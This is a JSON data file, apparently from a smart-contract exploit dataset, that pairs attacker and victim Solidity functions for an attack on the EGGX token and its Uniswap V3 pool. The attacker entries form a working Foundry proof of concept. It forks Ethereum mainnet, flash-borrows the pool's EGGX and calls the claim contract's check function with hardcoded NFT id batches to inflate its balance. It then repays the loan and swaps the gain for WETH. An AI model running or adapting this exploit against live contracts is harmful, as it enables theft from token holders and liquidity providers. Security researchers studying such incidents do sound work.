[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        // evm_version Requires to be \"shanghai\"\n        cheats.createSelectFork(\"mainnet\", 19_252_567 - 1);\n        cheats.label(address(EGGX), \"EGGX\");\n        cheats.label(address(pool), \"EGGX_Pool\");\n        cheats.label(address(WETH), \"WETH\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(address(this).balance);\n        bytes memory pollbalance = abi.encode(EGGX.balanceOf(address(pool)));\n        WETH.approve(address(pool), type(uint256).max);\n        EGGX.approve(address(pool), type(uint256).max);\n        emit log_named_uint(\"Attacker ETH balance before exploit\", WETH.balanceOf(address(this)));\n        bool zeroForOne = false;\n        uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;\n        bytes memory data = abi.encodePacked(uint8(0x61));\n        pool.flash(address(this), 0, EGGX.balanceOf(address(pool)), pollbalance);\n        int256 amountSpecified = int256(EGGX.balanceOf(address(this)));\n        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);\n        emit log_named_uint(\"Attacker ETH balance after attack:\", WETH.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 pollbalance = abi.decode(data, (uint256));\n        uint256[] memory nftid = new uint256[](6);\n\n        nftid[0] = 30_342;\n        nftid[1] = 30_319;\n        nftid[2] = 30_031;\n        nftid[3] = 30_036;\n        nftid[4] = 30_028;\n        nftid[5] = 30_019;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_379;\n        nftid[1] = 30_363;\n        nftid[2] = 30_169;\n        nftid[3] = 30_267;\n        nftid[4] = 30_098;\n        nftid[5] = 30_484;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_281;\n        nftid[1] = 30_217;\n        nftid[2] = 30_245;\n        nftid[3] = 30_192;\n        nftid[4] = 30_027;\n        nftid[5] = 30_181;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_368;\n        nftid[1] = 30_488;\n        nftid[2] = 30_259;\n        nftid[3] = 30_284;\n        nftid[4] = 30_084;\n        nftid[5] = 30_395;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_408;\n        nftid[1] = 30_111;\n        nftid[2] = 30_365;\n        nftid[3] = 30_144;\n        nftid[4] = 30_176;\n        nftid[5] = 30_054;\n        EGGXCliam.check(nftid);\n\n        nftid[0] = 30_039;\n        nftid[1] = 30_045;\n        nftid[2] = 30_030;\n        nftid[3] = 30_070;\n        nftid[4] = 30_055;\n        nftid[5] = 30_213;\n        EGGXCliam.check(nftid);\n\n        emit log_named_uint(\"Attacker EGGX exploit balance:\", EGGX.balanceOf(address(this)));\n        EGGX.transfer(address(pool), pollbalance + fee1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IEGGXUNIV3POOL",
    "source_type": "victim_contract",
    "function_name": "flash",
    "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override lock noDelegateCall {\n        uint128 _liquidity = liquidity;\n        require(_liquidity > 0, 'L');\n\n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);\n        uint256 balance0Before = balance0();\n        uint256 balance1Before = balance1();\n\n        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);\n        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);\n\n        IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);\n\n        uint256 balance0After = balance0();\n        uint256 balance1After = balance1();\n\n        require(balance0Before.add(fee0) <= balance0After, 'F0');\n        require(balance1Before.add(fee1) <= balance1After, 'F1');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        if (paid0 > 0) {\n            uint8 feeProtocol0 = slot0.feeProtocol % 16;\n            uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;\n            if (uint128(fees0) > 0) protocolFees.token0 += uint128(fees0);\n            feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);\n        }\n        if (paid1 > 0) {\n            uint8 feeProtocol1 = slot0.feeProtocol >> 4;\n            uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;\n            if (uint128(fees1) > 0) protocolFees.token1 += uint128(fees1);\n            feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);\n        }\n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }\n\n    /// @inheritdoc IUniswapV3PoolOwnerActions\n",
    "description": ""
  },
  {
    "contract/interface": "IEGGXUNIV3POOL",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());\n            } else {\n                state.amountSpecifiedRemaining += step.amountOut.toInt256();\n                state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());\n            }\n\n            // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee\n            if (cache.feeProtocol > 0) {\n                uint256 delta = step.feeAmount / cache.feeProtocol;\n                step.feeAmount -= delta;\n                state.protocolFee += uint128(delta);\n            }\n\n            // update global fee tracker\n            if (state.liquidity > 0)\n                state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);\n\n            // shift tick if we reached the next price\n            if (state.sqrtPriceX96 == step.sqrtPriceNextX96) {\n                // if the tick is initialized, run the tick transition\n                if (step.initialized) {\n                    // check for the placeholder value, which we replace with the actual value the first time the swap\n                    // crosses an initialized tick\n                    if (!cache.computedLatestObservation) {\n                        (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(\n                            cache.blockTimestamp,\n                            0,\n                            slot0Start.tick,\n                            slot0Start.observationIndex,\n                            cache.liquidityStart,\n                            slot0Start.observationCardinality\n                        );\n                        cache.computedLatestObservation = true;\n                    }\n                    int128 liquidityNet =\n                        ticks.cross(\n                            step.tickNext,\n                            (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),\n                            (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),\n                            cache.secondsPerLiquidityCumulativeX128,\n                            cache.tickCumulative,\n                            cache.blockTimestamp\n                        );\n                    // if we're moving leftward, we interpret liquidityNet as the opposite sign\n                    // safe because liquidityNet cannot be type(int128).min\n                    if (zeroForOne) liquidityNet = -liquidityNet;\n\n                    state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);\n                }\n\n                state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;\n            } else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) {\n                // recompute unless we're on a lower tick boundary (i.e. already transitioned ticks), and haven't moved\n                state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);\n            }\n        }\n\n        // update tick and write an oracle entry if the tick change\n        if (state.tick != slot0Start.tick) {\n            (uint16 observationIndex, uint16 observationCardinality) =\n                observations.write(\n                    slot0Start.observationIndex,\n                    cache.blockTimestamp,\n                    slot0Start.tick,\n                    cache.liquidityStart,\n                    slot0Start.observationCardinality,\n                    slot0Start.observationCardinalityNext\n                );\n            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (\n                state.sqrtPriceX96,\n                state.tick,\n                observationIndex,\n                observationCardinality\n            );\n        } else {\n            // otherwise just update the price\n            slot0.sqrtPriceX96 = state.sqrtPriceX96;\n        }\n\n        // update liquidity if it changed\n        if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;\n\n        // update fee growth global and, if necessary, protocol fees\n        // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees\n        if (zeroForOne) {\n            feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token0 += state.protocolFee;\n        } else {\n            feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;\n            if (state.protocolFee > 0) protocolFees.token1 += state.protocolFee;\n        }\n\n        (amount0, amount1) = zeroForOne == exactInput\n            ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)\n            : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);\n\n        // do the transfers and collect payment\n        if (zeroForOne) {\n            if (amount1 < 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));\n\n            uint256 balance0Before = balance0();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance0Before.add(uint256(amount0)) <= balance0(), 'IIA');\n        } else {\n            if (amount0 < 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));\n\n            uint256 balance1Before = balance1();\n            IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);\n            require(balance1Before.add(uint256(amount1)) <= balance1(), 'IIA');\n        }\n\n        emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);\n        slot0.unlocked = true;\n    }\n\n    /// @inheritdoc IUniswapV3PoolActions\n",
    "description": ""
  },
  {
    "contract/interface": "IEGGXClaim",
    "source_type": "victim_contract",
    "function_name": "check",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(\n        address spender,\n        uint256 amountOrId\n    ) public virtual returns (bool) {\n        if (amountOrId <= minted && amountOrId > 0) {\n            address owner = _ownerOf[amountOrId];\n\n            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {\n                revert Unauthorized();\n            }\n\n            getApproved[amountOrId] = spender;\n\n            emit Approval(owner, spender, amountOrId);\n        } else {\n            allowance[msg.sender][spender] = amountOrId;\n\n            emit Approval(msg.sender, spender, amountOrId);\n        }\n\n        return true;\n    }\n\n    /// @notice Function native approvals\n    function setApprovalForAll(address operator, bool approved) public virtual {\n        isApprovedForAll[msg.sender][operator] = approved;\n\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /// @notice Function for mixed transfers\n",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(\n        address to,\n        uint256 amount\n    ) public virtual returns (bool) {\n        return _transfer(msg.sender, to, amount);\n    }\n\n    /// @notice Function for native transfers with contract support\n",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amountOrId\n    ) public virtual {\n        if (amountOrId <= minted) {\n            if (from != _ownerOf[amountOrId]) {\n                revert InvalidSender();\n            }\n\n            if (to == address(0)) {\n                revert InvalidRecipient();\n            }\n\n            if (\n                msg.sender != from &&\n                !isApprovedForAll[from][msg.sender] &&\n                msg.sender != getApproved[amountOrId]\n            ) {\n                revert Unauthorized();\n            }\n\n            balanceOf[from] -= _getUnit();\n\n            unchecked {\n                balanceOf[to] += _getUnit();\n            }\n\n            _ownerOf[amountOrId] = to;\n            delete getApproved[amountOrId];\n\n            // update _owned for sender\n            uint256 updatedId = _owned[from][_owned[from].length - 1];\n            _owned[from][_ownedIndex[amountOrId]] = updatedId;\n            // pop\n            _owned[from].pop();\n            // update index for the moved id\n            _ownedIndex[updatedId] = _ownedIndex[amountOrId];\n            // push token to to owned\n            _owned[to].push(amountOrId);\n            // update index for to owned\n            _ownedIndex[amountOrId] = _owned[to].length - 1;\n\n            emit Transfer(from, to, amountOrId);\n            emit ERC20Transfer(from, to, _getUnit());\n        } else {\n            uint256 allowed = allowance[from][msg.sender];\n\n            if (allowed != type(uint256).max)\n                allowance[from][msg.sender] = allowed - amountOrId;\n\n            _transfer(from, to, amountOrId);\n        }\n    }\n\n    /// @notice Function for fractional transfers\n",
    "description": ""
  },
  {
    "contract/interface": "IWeth",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGGX",
    "source_type": "victim_contract",
    "function_name": "minted",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IEGGX",
    "source_type": "victim_contract",
    "function_name": "tokenURI",
    "original_code": "    function tokenURI(uint256 id) public view override returns (string memory) {\n        if (bytes(baseTokenURI).length > 0) {\n            return string.concat(baseTokenURI, Strings.toString(id));\n        } else {\n            string memory image;\n            string memory color;\n            string memory pattern;\n            string memory wings;\n\n            (image, color, pattern, wings) = _getImage(id);\n\n            string memory jsonPreImage = string.concat(\n                string.concat(\n                    string.concat('{\"name\": \"EGGX #', Strings.toString(id)),\n                    '\",\"description\":\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\",\"external_url\":\"https://eggs.build\",\"image\":\"'\n                ),\n                string.concat(dataURI, image)\n            );\n            string memory jsonPostImage = string.concat(\n                '\",\"attributes\":[{\"trait_type\":\"Color\",\"value\":\"',\n                color\n            );\n            string memory jsonPostImage1 = string.concat(\n                '\"},{\"trait_type\":\"Pattern\",\"value\":\"',\n                pattern\n            );\n            \n            string memory j1 = string.concat(jsonPostImage, jsonPostImage1);\n\n            string memory jsonPostImage2 = string.concat(\n                '\"},{\"trait_type\":\"Wings\",\"value\":\"',\n                wings\n            );\n\n            string memory j2 = string.concat(j1, jsonPostImage2);\n\n            string memory jsonPostTraits = '\"}]}';\n\n            return\n                string.concat(\n                    \"data:application/json;utf8,\",\n                    string.concat(\n                        string.concat(jsonPreImage, j2),\n                        jsonPostTraits\n                    )\n                );\n        }\n    }\n}\n}\n",
    "description": ""
  }
]